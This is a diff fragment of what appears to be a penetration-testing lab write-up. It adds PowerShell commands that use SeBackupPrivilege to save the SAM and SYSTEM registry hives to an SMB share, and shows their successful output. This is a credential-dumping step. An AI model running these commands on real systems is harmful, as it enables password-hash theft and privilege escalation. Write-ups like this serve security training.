@@ -459,5 +459,11 @@ So none of these credenatials are valid so ill keep enumerating in my RDP sessio
 After opening powershell as as an administrator and checking privs i have the `SeBackupPrivilege` 
 
 ```python
-
+PS C:\> reg save hklm\sam c:\Share\sam
+The operation completed successfully.
+PS C:\> reg save hklm\system c:\Share\system
+The operation completed successfully.
+PS C:\>
 ```
+This saved the files to the SMB share called `Share`
+
